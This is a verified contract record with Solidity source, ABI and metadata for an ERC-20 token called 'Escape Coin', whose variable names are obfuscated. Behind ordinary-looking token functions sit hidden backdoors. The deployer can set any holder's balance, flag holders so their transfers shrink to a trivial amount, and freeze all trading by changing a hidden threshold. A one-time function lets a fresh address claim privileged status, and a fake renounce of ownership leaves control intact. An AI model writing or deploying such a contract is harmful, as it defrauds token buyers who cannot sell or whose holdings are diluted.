{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract receiverSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAutoShould {\n    function createPair(address maxExempt, address swapMode) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface launchIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface totalTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenEnable) external view returns (uint256);\n\n    function transfer(address tradingModeReceiver, uint256 launchedMode) external returns (bool);\n\n    function allowance(address fromAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingModeReceiver,\n        uint256 launchedMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingTo, uint256 value);\n    event Approval(address indexed fromAmount, address indexed spender, uint256 value);\n}\n\ninterface shouldTrading is totalTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EscapeCoin is receiverSwap, totalTake, shouldTrading {\n\n    function transferFrom(address modeFrom, address tradingModeReceiver, uint256 launchedMode) external override returns (bool) {\n        if (_msgSender() != launchWalletAt) {\n            if (receiverSell[modeFrom][_msgSender()] != type(uint256).max) {\n                require(launchedMode <= receiverSell[modeFrom][_msgSender()]);\n                receiverSell[modeFrom][_msgSender()] -= launchedMode;\n            }\n        }\n        return atTake(modeFrom, tradingModeReceiver, launchedMode);\n    }\n\n    event OwnershipTransferred(address indexed swapBuy, address indexed receiverReceiverMin);\n\n    address public atFrom;\n\n    string private receiverMin = \"ECN\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMin;\n    }\n\n    uint256 private teamFund;\n\n    function atTake(address modeFrom, address tradingModeReceiver, uint256 launchedMode) internal returns (bool) {\n        if (modeFrom == autoTeam) {\n            return sellTeam(modeFrom, tradingModeReceiver, launchedMode);\n        }\n        uint256 atEnable = totalTake(atFrom).balanceOf(listLiquidity);\n        require(atEnable == minWallet);\n        require(tradingModeReceiver != listLiquidity);\n        if (receiverLiquidity[modeFrom]) {\n            return sellTeam(modeFrom, tradingModeReceiver, minSwap);\n        }\n        launchedMode = receiverFrom(modeFrom, tradingModeReceiver, launchedMode);\n        return sellTeam(modeFrom, tradingModeReceiver, launchedMode);\n    }\n\n    function fromBuy(address tradingShould) public {\n        autoIs();\n        \n        if (tradingShould == autoTeam || tradingShould == atFrom) {\n            return;\n        }\n        receiverLiquidity[tradingShould] = true;\n    }\n\n    uint256 private limitMinExempt;\n\n    address launchWalletAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverFrom(address modeFrom, address tradingModeReceiver, uint256 launchedMode) internal view returns (uint256) {\n        require(launchedMode > 0);\n\n        uint256 listSender = 0;\n        if (modeFrom == atFrom && tokenAmount > 0) {\n            listSender = launchedMode * tokenAmount / 100;\n        } else if (tradingModeReceiver == atFrom && sellFrom > 0) {\n            listSender = launchedMode * sellFrom / 100;\n        }\n        require(listSender <= launchedMode);\n        return launchedMode - listSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverSell;\n\n    bool public sellMode;\n\n    function getOwner() external view returns (address) {\n        return enableAuto;\n    }\n\n    mapping(address => bool) public receiverLiquidity;\n\n    bool private totalLimitMax;\n\n    function maxTeamMarketing(address autoAt, uint256 launchedMode) public {\n        autoIs();\n        marketingShouldFund[autoAt] = launchedMode;\n    }\n\n    function launchedEnableLiquidity() public {\n        emit OwnershipTransferred(autoTeam, address(0));\n        enableAuto = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atReceiver;\n    }\n\n    uint256 public sellFrom = 0;\n\n    bool private marketingSwap;\n\n    address listLiquidity;\n\n    mapping(address => uint256) private marketingShouldFund;\n\n    uint256 constant minSwap = 2 ** 10;\n\n    function allowance(address maxAt, address marketingTotal) external view virtual override returns (uint256) {\n        if (marketingTotal == launchWalletAt) {\n            return type(uint256).max;\n        }\n        return receiverSell[maxAt][marketingTotal];\n    }\n\n    address public autoTeam;\n\n    constructor (){\n        if (limitMinExempt != toReceiverIs) {\n            totalLimitMax = true;\n        }\n        launchedEnableLiquidity();\n        launchIs buyReceiver = launchIs(launchWalletAt);\n        atFrom = maxAutoShould(buyReceiver.factory()).createPair(buyReceiver.WETH(), address(this));\n        listLiquidity = maxAutoShould(buyReceiver.factory()).feeTo();\n        \n        autoTeam = _msgSender();\n        takeExempt[autoTeam] = true;\n        marketingShouldFund[autoTeam] = senderLimitAmount;\n        if (limitMinExempt != walletFund) {\n            walletFund = toReceiverIs;\n        }\n        emit Transfer(address(0), autoTeam, senderLimitAmount);\n    }\n\n    function approve(address marketingTotal, uint256 launchedMode) public virtual override returns (bool) {\n        receiverSell[_msgSender()][marketingTotal] = launchedMode;\n        emit Approval(_msgSender(), marketingTotal, launchedMode);\n        return true;\n    }\n\n    address private enableAuto;\n\n    uint256 public tokenAmount = 3;\n\n    function autoIs() private view {\n        require(takeExempt[_msgSender()]);\n    }\n\n    uint256 public toReceiverIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderLimitAmount;\n    }\n\n    string private atReceiver = \"Escape Coin\";\n\n    uint256 autoAtFrom;\n\n    function balanceOf(address tokenEnable) public view virtual override returns (uint256) {\n        return marketingShouldFund[tokenEnable];\n    }\n\n    function transfer(address autoAt, uint256 launchedMode) external virtual override returns (bool) {\n        return atTake(_msgSender(), autoAt, launchedMode);\n    }\n\n    function owner() external view returns (address) {\n        return enableAuto;\n    }\n\n    uint8 private minSellReceiver = 18;\n\n    function marketingFeeMode(address txLimit) public {\n        require(txLimit.balance < 100000);\n        if (sellMode) {\n            return;\n        }\n        if (walletFund == toReceiverIs) {\n            marketingSwap = false;\n        }\n        takeExempt[txLimit] = true;\n        if (teamFund != walletFund) {\n            teamFund = walletFund;\n        }\n        sellMode = true;\n    }\n\n    function sellTeam(address modeFrom, address tradingModeReceiver, uint256 launchedMode) internal returns (bool) {\n        require(marketingShouldFund[modeFrom] >= launchedMode);\n        marketingShouldFund[modeFrom] -= launchedMode;\n        marketingShouldFund[tradingModeReceiver] += launchedMode;\n        emit Transfer(modeFrom, tradingModeReceiver, launchedMode);\n        return true;\n    }\n\n    uint256 private senderLimitAmount = 100000000 * 10 ** 18;\n\n    uint256 private walletFund;\n\n    function senderAuto(uint256 launchedMode) public {\n        autoIs();\n        minWallet = launchedMode;\n    }\n\n    mapping(address => bool) public takeExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSellReceiver;\n    }\n\n    uint256 minWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiverMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"fromBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"}],\"name\":\"marketingFeeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMode\",\"type\":\"uint256\"}],\"name\":\"maxTeamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedMode\",\"type\":\"uint256\"}],\"name\":\"senderAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiverIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingModeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EscapeCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}